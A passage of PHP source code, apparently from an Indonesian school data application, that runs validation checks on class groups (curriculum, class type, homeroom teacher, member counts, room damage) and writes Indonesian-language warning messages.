                                    and rombongan_belajar.jenis_rombel = 1
                                    and jurusan_sp.jurusan_id <> kurikulum.jurusan_id";

                        $datas = getDataBySql($sql, FALSE, DBNAME);

                        foreach ($datas as $data) {

                            $keterangan = "Rombongan Belajar dengan <b>". $data['tingkat_pendidikan_id'] ." - ". $data['nama'] ."</b> dalam pemilihan kurikulum tidak sesuai dengan kompentensi/program keahlian yang dipilih. Silakan pilih kurikulum yang sesuai";
                            $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);

                        }

                    }

                    $sql = "select distinct
                                semester.semester_id,
                                rombongan_belajar.tingkat_pendidikan_id,
                                (case when kurikulum.nama_kurikulum ilike '%2013%' then 1 else 0 end) as is_k13
                            from rombongan_belajar
                            join ref.kurikulum on rombongan_belajar.kurikulum_id = kurikulum.kurikulum_id
                            join (
                                select
                                    max(semester_id) as semester_id
                                from ref.semester
                                where
                                    periode_aktif = 0
                                order by
                                    semester_id asc
                            ) semester on rombongan_belajar.semester_id = semester.semester_id
                            join ref.semester semester_now on rombongan_belajar.semester_id = semester_now.semester_id
                            where
                                rombongan_belajar.soft_delete = 0
                                and rombongan_belajar.jenis_rombel = 1
                                and rombongan_belajar.sekolah_id = '{$sekolah_id}'
                                and semester_now.semester = 2
                            order by
                                rombongan_belajar.tingkat_pendidikan_id";

                    $rombelSemesterKemaren = getDataBySql($sql, FALSE, DBNAME);

                    $isk13perTingkat = array();
                    foreach ($rombelSemesterKemaren as $rombelKemaren) {
                        if ($rombelKemaren["is_k13"]) {
                            $isk13perTingkat[$rombelKemaren["tingkat_pendidikan_id"]] = $rombelKemaren["is_k13"];
                        }
                    }
                    // print_r($isk13perTingkat); die;

                    $sdRombelCount = 0;
                    $smpRombelCount = 0;
                    $smaRombelCount = 0;
                    $smkRombelCount = 0;
                    $sdlbRombelCount = 0;
                    $smplbRombelCount = 0;
                    $smalbRombelCount = 0;
                    $jenisRombelRegulerCount = 0;
                    $jenisRombelSksCount = 0;

                    $rombelCountPerTingkat = array();
                    $jumlahPdPerTingkat = array();
                    $arrNamaRombel = array();

                    foreach ($rombels as $rombel) {

                        if ($rombel->getJenisRombel() == 1) {
                            $jenisRombelRegulerCount++;
                        } else if (in_array($rombel->getJenisRombel(), array(11,12,13))) {
                            $jenisRombelSksCount++;
                        }

                        $request->query->set('id_ruang', $rombel->getIdRuang());
                        $request->query->set('limit', 'unlimited');
                        $tingkatKerusakanTotalJson = Sarpras::getTingkatKerusakanTotal($request, $app);
                        $tingkatKerusakanTotal = json_decode($tingkatKerusakanTotalJson);

                        if ($tingkatKerusakanTotal[0]->persentase_total > 65) {
                            $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> terdeteksi tidak wajar karena tingkat kerusakan diatas > 65% (rusak total) namun masih digunakan sebagai tempat pembelajaran";
                            $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                        } else if ($tingkatKerusakanTotal[0]->persentase_total > 45) {
                            $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> terdeteksi tidak wajar karena tingkat kerusakan diatas > 45% (rusak berat) namun masih digunakan sebagai tempat pembelajaran";
                            $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                        }

                        if ($rombel->getJenisRombel() == 10) {
                            $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> berjenis rombel Kelas Akselerasi. Jenis rombel tersebut tidak lagi diizinkan";
                            $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                        }

                        if ($bentukPendidikan == 15) {
                            if (in_array($rombel->getJenisRombel(), array(8,9)) && in_array($rombel->getTingkatPendidikanId(), [10])) {
                                $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> berjenis rombel ".$rombel->getJenisRombel()==8?'Kelas Jauh/Kecil':'Kelas Terbuka'." dengan tingkat {$rombel->getTingkatPendidikanId()} tidak diizinkan untuk jenjang SMK";
                                $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                            }
                        }

                        /* switch ($rombel->getJenisRombel()) {
                            case 1: $jenisRombelStr = "Kelas Utama"; break;
                            case 2: $jenisRombelStr = "Kelas Teori"; break;
                            case 3: $jenisRombelStr = "Kelas Praktik"; break;
                            case 4: $jenisRombelStr = "Kelas Praktik2"; break;
                            case 5: $jenisRombelStr = "Kelas Agama"; break;
                            case 6: $jenisRombelStr = "Kelas Seni Budaya"; break;
                            case 7: $jenisRombelStr = "Kelas Prakarya"; break;
                            case 8: $jenisRombelStr = "Kelas Jauh/Kecil"; break;
                            case 9: $jenisRombelStr = "Kelas Terbuka"; break;
                            case 10: $jenisRombelStr = "Kelas Akselerasi"; break;
                            case 51: $jenisRombelStr = "Ekstrakurikuler"; break;
                            default: $jenisRombelStr = $rombel->getJenisRombel()." - Tidak Diketahui"; break;
                        } */
                        $jenisRombelObj = JenisRombelPeer::retrieveByPk($rombel->getJenisRombel());
                        if (is_object($jenisRombelObj)) {
                            $jenisRombelStr = $jenisRombelObj->getNmJenisRombel();
                        } else {
                            $jenisRombelStr = $rombel->getJenisRombel()." - Tidak Diketahui";
                        }

                        if (in_array($rombel->getJenisRombel(), array(1,8,9,10,11,12,13))) {
                            $arrNamaRombel[$rombel->getNama()] += 1;

                            if (!in_array($rombel->getTingkatPendidikanId(), array(1,2,3,4,5,6,7,8,9,10,11,12,13,71,72))) {
                                $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> berjenis rombel <b>{$jenisRombelStr}</b> harap memilih tingkat pendidikan dengan benar";
                                $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                            }
                        }

                        $semester = substr($sessionSemester, 4, 1);
                        // echo $semester;die;
                        // validasi khusus jenis rombel ekskul
                        if ($rombel->getJenisRombel() == 51) {
                            $c = new \Criteria();
                            $c->add(AnggotaRombelPeer::ROMBONGAN_BELAJAR_ID, $rombel->getRombonganBelajarId());
                            $c->add(AnggotaRombelPeer::SOFT_DELETE, 0);
                            $countAnggotaRombelEkskul = AnggotaRombelPeer::doCount($c);

                            if ($countAnggotaRombelEkskul < 1) {
                                $keterangan = "Rombel jenis Ekstrakurikuler dengan nama <b>{$rombel->getNama()}</b> belum mempunyai anggota rombel";
                                $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                            }

                            // hanya diatas validasi utk rombel ekskul
                            continue;
                        } else if ($rombel->getJenisRombel() == 3) {

                        } else if ($rombel->getJenisRombel() == 8) {
                            // kelas jauh/kecil
                            $c = new \Criteria();
                            $c->add(LayananKhususPeer::SEKOLAH_ID, $sekolah_id);
                            $c->add(LayananKhususPeer::SOFT_DELETE, 0);
                            $c->add(LayananKhususPeer::ID_JENIS_LK, '000001');
                            $layanaKhususSekolahKelasJauhCount = LayananKhususPeer::doCount($c);

                            if ($layanaKhususSekolahKelasJauhCount < 1) {
                                $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> berjenis rombel Kelas Jauh/Kecil, harap mengisi layanan khusus dengan jenis layanan jauh/kecil pada data rinci sekolah";
                                $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                            }
                        } else if ($rombel->getJenisRombel() == 9) {
                            // kelas terbuka
                            $c = new \Criteria();
                            $c->add(LayananKhususPeer::SEKOLAH_ID, $sekolah_id);
                            $c->add(LayananKhususPeer::SOFT_DELETE, 0);
                            $c->add(LayananKhususPeer::ID_JENIS_LK, '000002');
                            $layanaKhususSekolahTerbukaCount = LayananKhususPeer::doCount($c);

                            if ($layanaKhususSekolahTerbukaCount < 1) {
                            $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> berjenis rombel Kelas Terbuka, harap mengisi layanan khusus dengan jenis layanan terbuka pada data rinci sekolah";
                                $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                            }
                        } else if ($rombel->getJenisRombel() == 11) {
                            if ($semester == 1
                                && (
                                    ($rombel->getTingkatPendidikanId() == 10 && $sekolahObj->getBentukPendidikanId() == 13) 
                                    OR ($rombel->getTingkatPendidikanId() == 7 && $sekolahObj->getBentukPendidikanId() == 6))
                                ) {
                                $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> pada tingkat {$rombel->getTingkatPendidikanId()} tidak diperkenankan memilih jenis rombel SKS 4 Semester";
                                $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                            }
                        }

                        if ($sekolahObj->getFlag() != 3) {
                            // KTSP
                            // if (in_array($rombel->getKurikulumId(), array(4,8))) {
                            /*if (strpos($rombel->getKurikulum()->getNamaKurikulum(), "2013") !== FALSE) {
                                $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> memilih K13. K13 hanya dapat dilakukan pada sekolah yang diizinkan dari pusat";
                                $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                            }*/
                        } else {
                            // K13
                            // echo $isk13perTingkat[$rombel->getTingkatPendidikanId()-1]; die;
                            if ($isk13perTingkat[$rombel->getTingkatPendidikanId()-1] &&
                                strpos($rombel->getKurikulum()->getNamaKurikulum(), "2013") === FALSE) {
                                $keterangan = "Rombel dgn tingkat {$rombel->getTingkatPendidikanId()} dan nama <b>{$rombel->getNama()}</b> K13, dikarenakan pada semester sebelumnya pada tingkat ".$isk13perTingkat[$rombel->getTingkatPendidikanId()-1]." salah satu rombelnya telah melaksanakan K13";
                                $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                            }
                        }

                        if($app['session']->get('jenjang') == 'DIKMEN'){

                            if(in_array($rombel->getJenisRombel(), array(1,8,9,10,11,12,13))) {

                                if ($bentukPendidikan == 15) {
                                    $jurusan_sp = "Kompetensi Keahlian";

                                    /*if ($sekolahObj->getFlag() == 3 && $rombel->getJurusanSpId()) {
                                        if ($rombel->getTingkatPendidikanId() == 10 && $rombel->getJurusanSp()->getJurusan()->getLevelBidangId() != 11) {
                                            $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> memiliki <b>".$jurusan_sp."</b> yang tidak sesuai dengan ketentuan kurikulum yang ada";
                                            $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                                        } else if ($rombel->getTingkatPendidikanId() > 10 && $rombel->getJurusanSp()->getJurusan()->getLevelBidangId() != 12) {
                                            $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> memiliki <b>".$jurusan_sp."</b> yang tidak sesuai dengan ketentuan kurikulum yang ada";
                                            $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                                        }

                                        // if ($rombel->getTingkatPendidikanId() == 10) {
                                        //     echo $rombel->getKurikulum()->getNamaKurikulum(); die;
                                        //     var_dump(strpos($rombel->getKurikulum()->getNamaKurikulum(), "REV")); die;
                                        // }

                                        if ($rombel->getTingkatPendidikanId() == 10 && strpos($rombel->getKurikulum()->getNamaKurikulum(), "REV") === FALSE) {
                                            $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> bagi tingkat X wajib memilih kurikulum spektrum baru SMK. (Saat ini menggunakan kurikulum <b>{$rombel->getKurikulum()->getNamaKurikulum()}</b>)";
                                                $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                                        }
                                    } else {
                                        if ($rombel->getJurusanSpId()) {
                                            if ($rombel->getJurusanSp()->getJurusan()->getLevelBidangId() != 12) {
                                                $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> memiliki <b>".$jurusan_sp."</b> yang tidak sesuai dengan ketentuan kurikulum yang ada";
                                                $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                                            }
                                        }
                                    }*/
                                } else if ($bentukPendidikan == 13) {
                                    $jurusan_sp = "Program Keahlian";

                                    if ($sekolahObj->getFlag() == 3 && $rombel->getJurusanSpId()) {

                                        // K13
                                        if ($rombel->getTingkatPendidikanId() == 10) {

                                            if ($rombel->getJurusanSp()->getJurusanId() == '00000095' && $rombel->getKurikulumId() != 23) {
                                                $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> memiliki Program Keahlian dan kurikulum yang tidak sesuai. Seharusnya SMA yang menjalankan K13 dengan <b>Program Keahlian MIPA</b> wajib memilih <b>Kurikulum SMA 2013 MIPA</b>";
                                                $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                                            }

                                            if ($rombel->getJurusanSp()->getJurusanId() == '00000100' && $rombel->getKurikulumId() != 22) {
                                                $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> memiliki Program Keahlian dan kurikulum yang tidak sesuai. Seharusnya SMA yang menjalankan K13 dengan <b>Program Keahlian Ilmu Pengetahuan Sosial</b> wajib memilih <b>Kurikulum SMA 2013 IPS</b>";
                                                $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                                            }

                                            if ($rombel->getJurusanSp()->getJurusanId() == '00000105' && $rombel->getKurikulumId() != 21) {
                                                $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> memiliki Program Keahlian dan kurikulum yang tidak sesuai. Seharusnya SMA yang menjalankan K13 dengan <b>Program Keahlian Bahasa dan Budaya</b> wajib memilih <b>Kurikulum SMA 2013 Bhs&Budaya</b>";
                                                $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                                            }

                                            if (strpos($rombel->getKurikulum()->getNamaKurikulum(), "2013") === FALSE) {
                                                $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> menjalankan kurikulum selain kurikulum 2013. Sekolah anda menjalankan K13, seharusnya disemua tingkat wajib memilih kurikulum 2013";
                                                $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                                            }

                                        }

                                    } else if ($rombel->getJurusanSpId()) {
                                        if (strpos($rombel->getKurikulum()->getNamaKurikulum(), "2013") === FALSE) {
                                            // KTSP
                                            if ($rombel->getJurusanSp()->getJurusanId() == '00000' && $rombel->getTingkatPendidikanId() >= 10 && $rombel->getKurikulumId() != 10) {
                                                $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b>, untuk SMA yang menjalankan KTSP UMUM, Program Keahlian Umum yang diijinkan hanya berlaku untuk kelas X saja";
                                                $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                                            }

                                            if ($rombel->getTingkatPendidikanId() == 10 && $rombel->getJurusanSp()->getJurusanId() != '00000') {
                                                $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b>, untuk SMA yang menjalankan kurikulum KTSP, Program Keahlian yang diizinkan hanya Program Keahlian Umum saja";
                                                $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                                            }

                                            if ($rombel->getTingkatPendidikanId() >= 11) {
                                                if ($rombel->getJurusanSp()->getJurusanId() == '00000045' && $rombel->getKurikulumId() != 24) {
                                                    $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> memiliki Program Keahlian dan kurikulum yang tidak sesuai. Seharusnya SMA KTSP dengan <b>Ilmu Pengetahuan Alam (IPA)</b> wajib memilih <b>Kurikulum SMA KTSP IPA</b>";
                                                    $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                                                }

                                                if ($rombel->getJurusanSp()->getJurusanId() == '00000050' && $rombel->getKurikulumId() != 25) {
                                                    $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> memiliki Program Keahlian dan kurikulum yang tidak sesuai. Seharusnya SMA KTSP dengan <b>Ilmu Pengetahuan Sosial (IPS)</b> wajib memilih <b>Kurikulum SMA KTSP IPS</b>";
                                                    $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                                                }

                                                if ($rombel->getJurusanSp()->getJurusanId() == '00000051' && $rombel->getKurikulumId() != 26) {
                                                    $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> memiliki Program Keahlian dan kurikulum yang tidak sesuai. Seharusnya SMA KTSP dengan <b>Bahasa</b> wajib memilih <b>Kurikulum SMA KTSP Bahasa</b>";
                                                    $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                                                }
                                            }
                                        }
                                    }
                                }

                                if($rombel->getJurusanSpId() == null){
                                    $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> belum memiliki program pengajaran/Kompetensi keahlian";
                                    $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                                }

                            }
                        }

                        $wali_kelas = PtkPeer::retrieveByPK($rombel->getPtkId());

                        if (in_array($rombel->getJenisRombel(), array(1,8,9,10,11,12,13))) {
                            if (is_object($wali_kelas)) {

                                $d = new \Criteria();
                                $d->add(PtkTerdaftarPeer::PTK_ID, $rombel->getPtkId());
                                $d->add(PtkTerdaftarPeer::TAHUN_AJARAN_ID, $tahunAjaranId);
                                $d->add(PtkTerdaftarPeer::SEKOLAH_ID, $sekolah_id);
                                $ptkd = PtkTerdaftarPeer::doSelectOne($d);

                                if ($ptkd) {
                                    if($ptkd->getJenisKeluarId() != null){
                                        $keterangan = "Rombel <b>{$rombel->getNama()}</b> memiliki wali kelas a/n <b>{$wali_kelas->getNama()}</b> yang telah non-aktif";
                                        $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                                    }
                                }

                                if ($wali_kelas->getSoftDelete() == 1) {
                                    $keterangan = "Rombel <b>{$rombel->getNama()}</b> memiliki wali kelas a/n <b>{$wali_kelas->getNama()}</b> yang telah dihapus dari daftar PTK";
                                    $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                                }

                            } else {
                                $keterangan = "Rombel <b>{$rombel->getNama()}</b> tidak memiliki wali kelas";
                                $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                            }

                            // var_dump(strpos($rombel->getKurikulum()->getNamaKurikulum(), "2013"));
                            if (in_array($rombel->getTingkatPendidikanId(), array(1,2,4,5,7,8,10,11))) {
                                if (strpos($rombel->getKurikulum()->getNamaKurikulum(), "2013") === false) {
                                    $keterangan = "Rombel <b>{$rombel->getNama()}</b> dengan <b>Tingkat ".$rombel->getTingkatPendidikanId()."</b> wajib memilih Kurikulum 2013 (Saat ini memilih <b>".$rombel->getKurikulum()->getNamaKurikulum()."</b>)";

                                    if (in_array($sekolahObj->getBentukPendidikanId(), array(5,6,7,8,13,14,15,29))) {
                                        $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                                    } else {
                                        if (!in_array($sekolahObj->getBentukPendidikanId(), array(51,52,53,54,55))) {
                                            $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                                        }
                                    }
                                }
                            }
                        }

                        $tingkatPendidikan = $rombel->getTingkatPendidikanId();

                        $c = new \Criteria();
                        $c->add(AnggotaRombelPeer::SOFT_DELETE, 0);
                        $jmlAnggRombel = sizeof($rombel->getAnggotaRombels($c));

                        $c = new \Criteria();
                        $c->add(PembelajaranPeer::SOFT_DELETE, 0);
                        $c->add(PembelajaranPeer::SEMESTER_ID, $sessionSemester);
                        $jmlPembelajaran = sizeof($rombel->getPembelajarans($c));

                        if ($jmlAnggRombel < 1) {

                            $keterangan = "Rombongan belajar dengan jenis <b>{$jenisRombelStr}</b> dan nama <b>{$rombel->getNama()}</b> tidak memiliki anggota rombel";
                            $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);

                        } else {

                            if ($bentukPendidikan == 15 && $rombel->getJenisRombel() == 3) {
                                $excludeJurusanPewayanganArr = array('50106','50106880','50106885','50108','50108890','50110','50110895','50112','50112900','50108815','50108820','50108830','50108835','50108840','50108845','50110815','50110820','50110825','50110830','50110835','50110840','50110845','50110850','50112910','50112915','50112920','50112925','55116','46341','46351','46361','46371','46341630','46341635','46351640','46351645','46361650','46361655','46371660','50108810','50108825');

                                if ($jmlAnggRombel < 10 && !in_array($rombel->getJurusanSp()->getJurusanId(), $excludeJurusanPewayanganArr)) {
                                    $keterangan = "Rombongan belajar dengan jenis <b>{$jenisRombelStr}</b> dan nama <b>{$rombel->getNama()}</b> minimal memiliki 10 anggota rombel. (Saat ini hanya berjumlah {$jmlAnggRombel} peserta didik)";
                                    $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                                }
                            }

                            /*
                            // Peraturan expired, kesepakatan pada tanggal 11 Juli 2018 @Hotel 88 Fatmawati bahwa perhitungan ini diganti dengan perhitungan rasio siswa terhadap rombel
                            if (in_array($bentukPendidikan, array(5,6,13,36,38,53,54)) && $jmlAnggRombel < 20) {
                                // SD, SMP, SMA
                                $keterangan = "Jumlah minimal anggota rombel pada <b>{$rombel->getNama()}</b> adalah 20 (anggota rombel saat ini = ".$jmlAnggRombel.")";
                                $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                            } else if (in_array($bentukPendidikan, array(15)) && in_array($rombel->getJenisRombel(), array(1,8,9,10)) && $jmlAnggRombel < 15) {
                                // SMK
                                $keterangan = "Jumlah minimal anggota rombel pada <b>{$rombel->getNama()}</b> adalah 15 (anggota rombel saat ini = ".$jmlAnggRombel.")";
                                $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                            }

                            if ($bentukPendidikan == 5 && in_array($rombel->getJenisRombel(), array(1,8,9,10)) && $jmlAnggRombel > 28) {
                                $keterangan = "Jumlah maksimal anggota rombel pada <b>{$rombel->getNama()}</b> adalah 28 (anggota rombel saat ini = ".$jmlAnggRombel.")";
                                $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                            }

                            if ($bentukPendidikan == 6 && in_array($rombel->getJenisRombel(), array(1,8,9,10)) && $jmlAnggRombel > 32) {
                                $keterangan = "Jumlah maksimal anggota rombel pada <b>{$rombel->getNama()}</b> adalah 32 (anggota rombel saat ini = ".$jmlAnggRombel.")";
                                $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                            }

                            if (in_array($bentukPendidikan, array(13,15)) && $jmlAnggRombel > 36) {
                                $keterangan = "Jumlah maksimal anggota rombel pada <b>{$rombel->getNama()}</b> adalah 36 (anggota rombel saat ini = ".$jmlAnggRombel.")";
                                $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                            }
                            */

                            // $z = new \Criteria();
                            // $z->add(RombonganBelajarPeer::SOFT_DELETE,0);
                            // $z->add(RombonganBelajarPeer::JENIS_ROMBEL,1);
                            // $z->add(RombonganBelajarPeer::SEKOLAH_ID, $sekolah_id);
                            // $z->add(RombonganBelajarPeer::SEMESTER_ID, $sessionSemester);
                            // $z->add(RombonganBelajarPeer::JURUSAN_SP_ID, $rombel->getJurusanSpId());
                            // $countJurRom = RombonganBelajarPeer::doCount($z);

                            // if($countJurRom > 1){

                            //     if (in_array($bentukPendidikan, $sma) && $rombel->getJenisRombel() ==  1 && $jmlAnggRombel < 20) {
                            //         // SMA
                            //         $keterangan = "Jumlah minimal anggota rombel paralel <b>{$rombel->getNama()}</b> adalah 20 (anggota rombel saat ini = ".$jmlAnggRombel.")";
                            //         $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                            //     }

                            //     if (in_array($bentukPendidikan, $smk) && $rombel->getJenisRombel() ==  1 && $jmlAnggRombel < 15) {
                            //         // SMK
                            //         $keterangan = "Jumlah minimal anggota rombel paralel <b>{$rombel->getNama()}</b> adalah 15 (anggota rombel saat ini = ".$jmlAnggRombel.")";
                            //         $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                            //     }

                            // }

                        }

                        if ($jmlPembelajaran < 1) {
                            $keterangan = "Rombel dengan jenis <b>{$jenisRombelStr}</b> dan nama <b>{$rombel->getNama()}</b> tidak memiliki pembelajaran";
                            $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                        }

                        if (in_array($bentukPendidikan, $sd) && $tingkatPendidikan > 6) {
                            // SD dan SDLB
                            $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> invalid dalam mengisi <b>Tingkat Pendidikan</b>. Jenjang <b>$bentukPendidikanNama</b> hanya mengisi 1 s/d 6";
                            $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                        }

                        if (in_array($bentukPendidikan, $smp) && $tingkatPendidikan < 7) {
                            // SMP dan SMPLB
                            $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> invalid dalam mengisi <b>Tingkat Pendidikan</b>. Jenjang <b>$bentukPendidikanNama</b> hanya mengisi 7 s/d 9";
                            $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                        }

                        if (in_array($bentukPendidikan, $dikmen) && $tingkatPendidikan < 10) {
                            // SMP dan SMPLB
                            $keterangan = "Rombel dengan nama <b>{$rombel->getNama()}</b> invalid dalam mengisi <b>Tingkat Pendidikan</b>. Jenjang <b>$bentukPendidikanNama</b> hanya mengisi 10 s/d 12/13";
                            $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                        }

                        // var_dump($bentukPendidikan); die;
                        if (in_array($rombel->getJenisRombel(), array(1,8,9,10,11,12,13))) {
                            switch ($bentukPendidikan) {
                                case 5: $sdRombelCount++; break;
                                case 6: $smpRombelCount++; break;
                                case 7: $sdlbRombelCount++; break;
                                case 8: $smplbRombelCount++; break;
                                case 13: $smaRombelCount++; break;
                                case 14: $smalbRombelCount++; break;
                                case 15: $smkRombelCount++; break;
                            }
                        }

                        if (in_array($rombel->getJenisRombel(), array(1,8,9,10,11,12,13))) {
                            $rombelCountPerTingkat[$tingkatPendidikan]++;
                            $jumlahPdPerTingkat[$tingkatPendidikan][$rombel->getPrimaryKey()."==".$rombel->getNama()] = $jmlAnggRombel;
                        }
                    }

                    if (($jenisRombelRegulerCount+$jenisRombelSksCount) < 1) {
                        $keterangan = "Terdeteksi rombongan belajar tidak memiliki jenis rombel Reguler dan/atau SKS";
                        $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                    }

                    foreach ($arrNamaRombel as $key => $value) {
                        if ($value > 1) {
                            $keterangan = "Terdeteksi nama rombongan belajar ganda dengan nama <b>".$key."</b>";
                            $this->setArrValidation($i++, "rombongan_belajar", 2, $keterangan);
                        }
                    }

                    $tampilCount = false;
                    if ($bentukPendidikan == 5) {
                        if ($sdRombelCount < 6 || $sdRombelCount > 24) {
                            $tampilCount = true;
                            $keterangan = "Sesuai dgn Permendikbud 22 Tahun 2016 jumlah rombongan belajar untuk {$bentukPendidikanNama} adalah 6-24. (Saat ini {$sdRombelCount} rombongan belajar)";
                        }
                    } else if ($bentukPendidikan == 6) {
                        if ($smpRombelCount < 3 || $smpRombelCount > 33) {
                            $tampilCount = true;
                            $keterangan = "Sesuai dgn Permendikbud 22 Tahun 2016 jumlah rombongan belajar untuk {$bentukPendidikanNama} adalah 3-33. (Saat ini {$smpRombelCount} rombongan belajar)";
                        }
                    } else if ($bentukPendidikan == 13) {
                        if ($smaRombelCount < 3 || $smaRombelCount > 36) {
                            $tampilCount = true;
                            $keterangan = "Sesuai dgn Permendikbud 22 Tahun 2016 jumlah rombongan belajar untuk {$bentukPendidikanNama} adalah 3-36. (Saat ini {$smaRombelCount} rombongan belajar)";
                        }
                    } else if ($bentukPendidikan == 15) {
                        if ($smkRombelCount < 3 || $smkRombelCount > 72) {
                            $tampilCount = true;
                            $keterangan = "Sesuai dgn Permendikbud 22 Tahun 2016 jumlah rombongan belajar untuk {$bentukPendidikanNama} adalah 3-72. (Saat ini {$smkRombelCount} rombongan belajar)";
                        }
                    } else if ($bentukPendidikan == 7) {
                        if ($sdlbRombelCount != 6) {
                            $tampilCount = true;
                            $keterangan = "Sesuai dgn Permendikbud 22 Tahun 2016 jumlah rombongan belajar untuk {$bentukPendidikanNama} adalah 6. (Saat ini {$sdlbRombelCount} rombongan belajar)";
                        }
                    } else if ($bentukPendidikan == 8) {
                        if ($smplbRombelCount != 3) {
                            $tampilCount = true;
                            $keterangan = "Sesuai dgn Permendikbud 22 Tahun 2016 jumlah rombongan belajar untuk {$bentukPendidikanNama} adalah 3. (Saat ini {$smpRombelCount} rombongan belajar)";
                        }
                    } else if ($bentukPendidikan == 14) {
                        if ($smalbRombelCount != 3) {
                            $tampilCount = true;
                            $keterangan = "Sesuai dgn Permendikbud 22 Tahun 2016 jumlah rombongan belajar untuk {$bentukPendidikanNama} adalah 3. (Saat ini {$smalbRombelCount} rombongan belajar)";
                        }
                    }

                    if ($tampilCount) {
                        $this->setArrValidation($i++, "rombongan_belajar", 1, $keterangan);
                    }

                }

                if ($bentukPendidikan == 15) {

                    // khusus rombel praktik
                    $sql = "select
                                rombongan_belajar.*,
                                jml_ar.jumlah as jumlah_anggota_rombel,
                                rombel_praktik.jumlah as rombel_praktik,
                                rombel_praktik.jumlah_pd as jumlah_anggota_rombel_praktik,
                                jurusan.jurusan_id
                            from rombongan_belajar
                            left outer join (
                                select
                                    anggota_rombel.rombongan_belajar_id,
                                    count(1) jumlah
                                from anggota_rombel
                                join peserta_didik on anggota_rombel.peserta_didik_id = peserta_didik.peserta_didik_id
                                join registrasi_peserta_didik on peserta_didik.peserta_didik_id = registrasi_peserta_didik.peserta_didik_id
                                where
                                    anggota_rombel.soft_delete = 0
                                    and peserta_didik.soft_delete = 0
                                    and registrasi_peserta_didik.jenis_keluar_id is null
                                    and registrasi_peserta_didik.soft_delete = 0
                                    and registrasi_peserta_didik.sekolah_id = '{$sekolah_id}'
                                group by
                                    anggota_rombel.rombongan_belajar_id
                            ) jml_ar on rombongan_belajar.rombongan_belajar_id = jml_ar.rombongan_belajar_id
                            inner join (
                                select
                                    rb.semester_id,
                                    rb.sekolah_id,
                                    rb.tingkat_pendidikan_id,
                                    rb.jurusan_sp_id,
                                    rb.kurikulum_id,
                                    rb.nama,
                                    rb.ptk_id,
                                    rb.id_ruang,
                                    rb.moving_class,
                                    rb.jenis_rombel,
                                    rb.sks,
                                    rb.kebutuhan_khusus_id,
                                    count(distinct rb.rombongan_belajar_id) jumlah,
                                    count(1) as jumlah_pd
                            from rombongan_belajar rb
                            left join anggota_rombel ar on rb.rombongan_belajar_id = ar.rombongan_belajar_id
                                and ar.soft_delete = 0
                            where
                                    rb.soft_delete = 0
